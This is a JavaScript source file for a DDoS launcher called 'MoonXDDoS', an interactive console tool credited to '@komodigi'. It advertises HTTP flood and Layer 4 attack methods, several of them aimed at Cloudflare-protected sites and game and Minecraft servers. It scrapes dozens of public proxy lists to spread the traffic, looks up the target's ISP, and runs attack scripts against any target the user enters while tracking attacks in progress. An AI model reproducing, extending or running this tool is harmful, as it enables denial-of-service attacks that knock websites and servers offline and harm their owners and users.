const readline = require('readline');
const { exec } = require('child_process');
const path = require('path');
const url = require('url');
const fs = require('fs');
const crypto = require('crypto');
const http = require('http');
const https = require('https');
const async = require('async');
const axios = require('axios');
const bodyParser = require('body-parser');
const cfonts = require('cfonts');
const chalk = require('chalk');
const cheerio = require('cheerio');
const colors = require('colors');
const fakeUseragent = require('fake-useragent');
const figlet = require('figlet');
const fetch = require('node-fetch');
const ssh2 = require('ssh2');
const proxyFile = "./methods/proxy.txt";
let processList = [];
const cyan = '\x1b[96m'
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const teks_hitam = '\x1b[30m';
const back_biru = '\x1b[44m';
const back_ungu = '\x1b[45m';
const back_biru_ungu = '\x1b[48;2;128;0;255m';
const biruUnguMuda = '\x1b[38;2;173;150;255m';

function pushMonitor(target, methods, duration) {
    processList.push({
        target,
        methods,
        duration,
        startTime: Date.now(),
        endTime: Date.now() + duration * 1000
    });
}

async function methods() {
console.clear();
console.clear();
console.clear();
console.clear();
console.log(`
\x1b[48;2;128;0;255m\x1b[1m NAME       │ DESCRIPTION                                   │ DURATION 
────────────┼───────────────────────────────────────────────┼──────────\x1b[0m
\x1b[45m\x1b[1mMoonXFast   │ [LAYER 7] Fast Big Request HTTP               │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXKill   │ [LAYER 7] Best Attack No Protector            │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXStars  │ [LAYER 7] Big Request                         │  300     \x1b[,
\x1b[45m\x1b[1mMoonXGood   │ [LAYER 7] Good Attacking Cloudfalre           │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXSlow   │ [LAYER 7] Slow Attacking Cloudfalre           │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXHigh   │ [LAYER 7] High Rps Attack                     │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXHttp   │ [LAYER 7] Good Attacking Cloudfalre HTTP      │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXCf     │ [LAYER 7] Best Attack For Cloudfalre          │  300     \x1b[0m
\x1b[45m\x1b[1mMoonXPps    │ [LAYER 4] Attacking IP Website                │  120     \x1b[0m
\x1b[45m\x1b[1mMoonXRst    │ [LAYER 4] Best Attacking For IP Game          │  120     \x1b[0m
\x1b[45m\x1b[1mMoonXMc     │ [LAYER 4] Best Attacking For IP Minecraft     │  120     \x1b[0m
 `);
 }

async function monitor() {
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("No Attack.");
        return;
    }

    let attackDetails = "\n";
    attackDetails += `\n`;
    attackDetails += `  NO  │        HOST          │ SINCE │ DURATION │ METHOD  \n`;
    attackDetails +=` ─────┼──────────────────────┼───────┼──────────┼─────────\n`;

    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`;

        attackDetails += `  ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since). padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} \n`;
    });

    attackDetails += `\n`;

    console.log(attackDetails);
}

async function scrapeProxy() {
    try {
        const proxyFilePath = path.join(__dirname, "methods", "proxy.txt");

        const urls = [
    'https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&protocol=http&proxy_format=ipport&format=text&timeout=20000',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/http.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/https.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/http.txt',
    'https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/master/https.txt',
    'https://raw.githubusercontent.com/BreakingTechFr/Proxy_Free/main/proxies/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies_anonymous/http.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/http/http.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/vakhov/fresh-proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/berkay-digital/Proxy-Scraper/main/proxies.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt',
    'https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt',
    'https://raw.githubusercontent.com/ALIILAPRO/Proxy/main/http.txt',
    'https://raw.githubusercontent.com/HumayunShariarHimu/Proxy/main/Anonymous_HTTP_One.md',
    'https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/https.txt',
    'https://raw.githubusercontent.com/ArrayIterator/proxy-lists/main/proxies/http.txt',
    'https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/http.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/https.txt',
    'https://raw.githubusercontent.com/elliottophellia/proxylist/master/results/http/global/http_checked.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/https/https.txt',
    'https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/http.txt',
    'https://raw.githubusercontent.com/ObcbO/getproxy/master/file/https.txt',
    'https://raw.githubusercontent.com/ObcbO/getproxy/master/file/http.txt',
    'https://raw.githubusercontent.com/Vann-Dev/proxy-list/main/proxies/https.txt',
    'https://raw.githubusercontent.com/themiralay/Proxy-List-World/master/data.txt',
    'https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt',
    'https://raw.githubusercontent.com/Skiddle-ID/proxylist/main/proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/http_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/https_proxies.txt',
    'https://raw.githubusercontent.com/MrMarble/proxy-list/main/all.txt',
    'https://raw.githubusercontent.com/ProxyScraper/ProxyScraper/main/http.txt',
    'https://raw.githubusercontent.com/TuanMinPay/live-proxy/master/http.txt',
    'https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt',
    'https://raw.githubusercontent.com/zevtyardt/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/miyukii-chan/proxy-list/master/proxies/http.txt',
    'https://raw.githubusercontent.com/mishakorzik/Free-Proxy/main/proxy.txt',
    'https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt',
    'https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt',
    'https://raw.githubusercontent.com/j0rd1s3rr4n0/api/main/proxy/http.txt',
    'https://raw.githubusercontent.com/HyperBeats/proxy-list/main/https.txt',
    'https://raw.githubusercontent.com/HyperBeats/proxy-list/main/http.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks5.txt',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt',
    'https://proxyspace.pro/http.txt',
    'https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks4.txt',
    'https://raw.githubusercontent.com/ErcinDedeoglu/proxies/main/proxies/socks5.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/http.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks4.txt',
    'https://raw.githubusercontent.com/MuRongPIG/Proxy-Master/main/socks5.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks4.txt',
    'https://raw.githubusercontent.com/zloi-user/hideip.me/main/socks5.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks4/socks4.txt',
    'https://raw.githubusercontent.com/officialputuid/KangProxy/KangProxy/socks5/socks5.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks4_proxies.txt',
    'https://raw.githubusercontent.com/Anonym0usWork1221/Free-Proxies/main/proxy_files/socks5_proxies.txt',
    'https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks5.txt',
    'https://raw.githubusercontent.com/ObcbO/getproxy/master/file/socks4.txt',
  ];

        console.log("start proxy scrape...\n");

        const responses = await Promise.all(
            urls.map(url => axios.get(url).catch(() => ({ data: "" })))
        );

        const proxies = responses
            .map(res => res.data.trim())
            .filter(Boolean)
            .join("\n");

        if (!proxies) {
            console.log("Error");
            return;
        }

        if (fs.existsSync(proxyFilePath)) {
            fs.unlinkSync(proxyFilePath);
        }

        fs.writeFileSync(proxyFilePath, proxies);

        const proxyTotal = proxies.split("\n").filter(p => p.trim() !== "").length;
        console.log(`successfully added ${proxyTotal} to ./methods/proxy.txt\n`);

    } catch (err) {
        console.error(err);
    }
}

async function getPublicIP() {
    try {
        const response = await axios.get('https://api.ipify.org?format=json');
        return response.data.ip;
    } catch (error) {
        return 'error';
    }
}

async function menu() {
console.clear();
console.clear();
console.clear();
console.clear();
console.log(`
\x1b[31m\x1b[1m⡿⠋⠄⣀⣀⣤⣴⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣌⠻⣿⣿\x1b[0m
\x1b[31m\x1b[1m⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⠹⣿\x1b[0m
\x1b[31m\x1b[1m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠹\x1b[0m
\x1b[31m\x1b[1m⣿⣿⡟⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡛⢿⣿⣿⣿⣮⠛⣿⣿⣿⣿⣿⣿⣿\x1b[0m        [ \x1b[31m\x1b[1m MoonXDDoS \x1b[0m ]
\x1b[31m\x1b[1m⡟⢻⡇⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣣⠄⡀⢬⣭⣻⣷⡌⢿⣿⣿⣿⣿⣿\x1b[0m
\x1b[31m\x1b[1m⠃⣸⡀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⣆⢹⣿⣿⣿⡈⢿⣿⣿⣿⣿\x1b[0m        \x1b[45m\x1b[1mattack - Attacking DDoS\x1b[0m
\x1b[31m\x1b[1m⠄⢻⡇⠄⢛⣛⣻⣿⣿⣿⣿⣿⣿⣿⣿⡆⠹⣿⣆⠸⣆⠙⠛⠛⠃⠘⣿⣿⣿⣿\x1b[0m        \x1b[45m\x1b[1mmethods - Show All Methods\x1b[0m
\x1b[31m\x1b[1m⠄⠸⣡⠄⡈⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠁⣠⣉⣤⣴⣿⣿⠿⠿⠿⡇⢸⣿⣿⣿\x1b[0m        \x1b[45m\x1b[1mhelp - Show All Menu\x1b[0m
\x1b[31m\x1b[1m⠄⡄⢿⣆⠰⡘⢿⣿⠿⢛⣉⣥⣴⣶⣿⣿⣿⣿⣻⠟⣉⣤⣶⣶⣾⣿⡄⣿⡿⢸\x1b[0m        \x1b[45m\x1b[1mongoing - The attack is underway\x1b[0m
\x1b[31m\x1b[1m⠄⢰⠸⣿⠄⢳⣠⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⣿⣿⣿⡇⢻⡇⢸\x1b[0m        \x1b[45m\x1b[1mcls - Clear Terminal Sessions\x1b[0m
\x1b[31m\x1b[1m⢷⡈⢣⣡⣶⠿⠟⠛⠓⣚⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⢸⠇⠘\x1b[0m        \x1b[45m\x1b[1mexit- Exit From This Tools\x1b[0m
\x1b[31m\x1b[1m⡀⣌⠄⠻⣧⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⢿⣿⣿⣿⣿⣿⡟⠘⠄⠄\x1b[0m        \x1b[45m\x1b[1mscrape - Scrape Proxy\x1b[0m
\x1b[31m\x1b[1m⣷⡘⣷⡀⠘⣿⣿⣿⣿⣿⣿⣿⣿⡋⢀⣠⣤⣶⣶⣾⡆⣿⣿⣿⠟⠁⠄⠄⠄⠄\x1b[0m
\x1b[31m\x1b[1m⣿⣷⡘⣿⡀⢻⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣿⣿⣿⣿⣷⡿⠟⠉⠄⠄⠄⠄⡄⢀\x1b[0m
\x1b[31m\x1b[1m⣿⣿⣷⡈⢷⡀⠙⠛⠻⠿⠿⠿⠿⠿⠷⠾⠿⠟⣛⣋⣥⣶⣄⠄⢀⣄⠹⣦⢹⣿\x1b[0m
`);
}

async function baner() {
const myIP = await getPublicIP();
const today = new Date().toLocaleDateString();
console.clear();
console.clear();
console.clear();
console.clear();
console.log(`
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀                 
\x1b[31m\x1b[1m⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
\x1b[31m\x1b[1m⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
\x1b[31m\x1b[1m⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀\x1b[0m⠀[ \x1b[1m\x1b[31mMoonXDDoS\x1b[0m ]
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀\x1b[0m⠀⠀⠀⠀⠀⠀\x1b[96m\x1b[1mCreated By:\x1b[0m \x1b[0m \x1b[38;2;173;150;255m\x1b[1m @komodigi\x1b[0m
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀\x1b[0m⠀⠀⠀⠀⠀\x1b[96m\x1b[1mDate: \x1b[0m \x1b[38;2;173;150;255m\x1b[1m${today}\x1b[0m
\x1b[31m\x1b[1m⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀\x1b[0m⠀\x1b[96m\x1b[1mYour Ip:\x1b[0m \x1b[0m \x1b[38;2;173;150;255m\x1b[1m${myIP}\x1b[0m
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀\x1b[0m⠀⠀\x1b[96m\x1b[1mYour Status:\x1b[0m \x1b[38;2;173;150;255m\x1b[1mADMIN\x1b[0m
\x1b[31m\x1b[1m⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
\x1b[31m\x1b[1m⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
\x1b[31m\x1b[1m⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀\x1b[0m

\x1b[44mType "help" To Show Menul\x1b[0m⠀⠀
`);
}

async function Attack(args) {
    if (args.length < 3) {
        console.log(`Useage: attack <target> <duration> <methods>`);
        return;
    }

    const [target, duration, methods] = args;

    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;

        console.clear();
        console.clear();
        console.clear();
        console.clear();
        console.clear();
        console.log(`
\x1b[31m\x1b[1m
⠀⠀⠀⠀⠀⠀⣰⠂⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⡟⢆⢠⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⡇⠹⢦⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠹⣦⣹⢸⡖⠤⢀⠀⠘⢿⠛⢔⠢⡀⠃⠣⠀⠇⢡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠹⠀⡷⣄⠠⡈⠑⠢⢧⠀⢢⠰⣼⢶⣷⣾⠀⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠤⢖⡆⠰⡙⢕⢬⡢⣄⠀⠑⢼⠀⠚⣿⢆⠀⠱⣸⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣤⡶⠮⢧⡀⠑⡈⢢⣕⡌⢶⠀⠀⣱⣠⠉⢺⡄⠀⢹⠀⠀⠀⠀     
⠀⠀⠀⠀⠀⠀⢀⡸⠀⠈⡗⢄⡈⢆⠙⠿⣶⣿⠿⢿⣷⣴⠉⠹⢶⢾⡆⠀⠀⠀    
⠀⠀⠀⢠⠶⠿⡉⠉⠉⠙⢻⣮⡙⢦⣱⡐⣌⠿⡄⢁⠄⠑⢤⣀⠐⢻⡇⠀⠀⠀      
⠀⠀⠀⢀⣠⠾⠖⠛⢻⠟⠁⢘⣿⣆⠹⢷⡏⠀⠈⢻⣤⡆⠀⠑⢴⠉⢿⣄⠀⠀      
⠀⠀⢠⠞⢃⢀⣠⡴⠋⠀⠈⠁⠉⢻⣷⣤⠧⡀⠀⠈⢻⠿⣿⡀⠀⢀⡀⣸⠀⠀      
⠀⠀⢀⠔⠋⠁⡰⠁⠀⢀⠠⣤⣶⠞⢻⡙⠀⠙⢦⠀⠈⠓⢾⡟⡖⠊⡏⡟⠀   
⠀⢠⣋⢀⣠⡞⠁⠀⠔⣡⣾⠋⠉⢆⡀⢱⡀⠀⠀⠀⠀⠀⠀⢿⡄⠀⢇⠇⠀⠀
⠀⠎⣴⠛⢡⠃⠀⠀⣴⡏⠈⠢⣀⣸⣉⠦⣬⠦⣀⠀⣄⠀⠀⠈⠃⠀⠀⠙⡀⠀     
⠀⡸⡁⣠⡆⠀⠀⣾⠋⠑⢄⣀⣠⡤⢕⡶⠁⠀⠀⠁⢪⠑⠤⡀⠀⢰⡐⠂⠑⢀
⠀⠏⡼⢋⠇⠀⣸⣟⣄⠀⠀⢠⡠⠓⣿⠇⠀⠀⠀⠀⠀⠑⢄⡌⠆⢰⣷⣀⡀⢸     
⠀⣸⠁⢸⠀⢀⡿⡀⠀⠈⢇⡀⠗⢲⡟⠀⠀⠀⠀⠀⠀⠀⠀⠹⡜⠦⣈⠀⣸⡄      
⠀⣧⠤⣼⠀⢸⠇⠉⠂⠔⠘⢄⣀⢼⠃⡇⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠚⠳⠋⠀      
⠐⠇⣰⢿⠀⣾⢂⣀⣀⡸⠆⠁⠀⣹⠀⢡⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        
⠀⢀⡏⣸⠀⣟⠁⠀⠙⢄⠼⠁⠈⢺⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀       
⠀⠈⡏⣸⢰⡯⠆⢤⠔⠊⢢⣀⣀⡼⡇⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⢻⢸⡇⠀⠀⠑⣤⠊⠀⠀⠈⣧⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠸⣼⢸⠟⠑⠺⡉⠈⢑⠆⠠⠐⢻⡄⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡟⣸⡀⠀⠀⣈⣶⡁⠀⠀⠀⢠⢻⡄⠀⠀⠀⠑⠤⣄⡀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⠁⣿⡿⠟⢏⠁⠀⢈⠖⠒⠊⠉⠉⠹⣄⠀⠀⠀⠀⠀⠈⠑⠢⡀⠀⠀⠀
⠀⣀⠟⢰⡇⠀⠀⠈⢢⡴⠊⠀⠀⠀⠀⠀⣸⢙⣷⠄⢀⠀⠠⠄⠐⠒⠚⠀⠀⠀
⠘⠹⠤⠛⠛⠲⢤⠐⠊⠈⠂⢤⢀⠠⠔⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠣⢀⡀⠔⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[0m
\x1b[96m[=============== \x1b[0m\x1b[31m\x1b[1mMoonXDDoS\x1b[0m \x1b[96m===============]
\x1b[96m\x1b[1mTarget    : \x1b[38;2;173;150;255m${target}\x1b[0m
\x1b[96m\x1b[1mDuration  : \x1b[38;2;173;150;255m${duration}\x1b[0m
\x1b[96m\x1b[1mMethods   : \x1b[38;2;173;150;255m${methods}\x1b[0m
\x1b[96m\x1b[1mAS        : \x1b[38;2;173;150;255m${result.as}\x1b[0m
\x1b[96m\x1b[1mIP        : \x1b[38;2;173;150;255m${result.query}\x1b[0m
\x1b[96m\x1b[1mISP       : \x1b[38;2;173;150;255m${result.isp}\x1b[0m
\x1b[96m\x1b[1mTool By   : \x1b[38;2;173;150;255m@komodigi\x1b[0m

\x1b[44mType "cls" To Clear This Terminal\x1b[0m
`);
    } catch (error) {
        console.log(`No Internet`);
        return;
    }

if (methods === 'MoonXKill') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXKill.js ${target} ${duration} 100000 200`);
} else if (methods === 'MoonXFast') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXFast.js ${target} ${duration}`);
} else if (methods === 'MoonXSus') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXSus.js ${target} ${duration} 1000000 900`);
} else if (methods === 'MoonXStars') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXStars.js ${target} ${duration} 100000 200`);
} else if (methods === 'MoonXHttp') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXHttp.js ${target} ${duration} 900`);
} else if (methods === 'MoonXGood') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXGood.js ${target} ${duration} 100000 200 ${proxyFile}`);
} else if (methods === 'MoonXHigh') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXHigh.js ${target} ${duration} 100000 500 100`);
} else if (methods === 'MoonXCf') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXCf.js ${target} ${duration} 1000000`);
} else if (methods === 'MoonXSlow') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXSlow.js ${target} ${duration}`);
} else if (methods === 'MoonXPps') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXPps.js ${target} ${duration} 443`);
} else if (methods === 'MoonXMc') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXMc.js ${target} 443 ${duration}`);
} else if (methods === 'MoonXRst') {
    pushMonitor(target, methods, duration);
    exec(`node ./methods/MoonXRst.js ${target} ${duration} 443`);
} else {
    console.log(`Method ${methods} not recognized. Use MoonXKill, MoonXFast, MoonXStarts, MoonXGood, or MoonXHigh.`);
}
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
    prompt: 'MoonXDDoS> '
});

(async () => {
    await baner();
    rl.prompt();

    rl.on('line', async (line) => {
        const input = line.trim().split(' ');
        const command = input[0];

        switch (command) {
            case 'help':
                await menu();
                break;

            case 'methods':
                await methods();
                break;

            case 'ongoing':
                await monitor();
                break;

            case 'cls':
                await baner();
                break;
            case 'scrape':
                await scrapeProxy();
                 break;

            case 'attack':
                await Attack(input.slice(1));
                break;

            case 'exit':
                console.log(`${cyan}[Outing...${Reset}`);
                process.exit(0);

            default:
                console.log(`Command "${command}" is not recognized`);
        }

        rl.prompt();
    });
})();
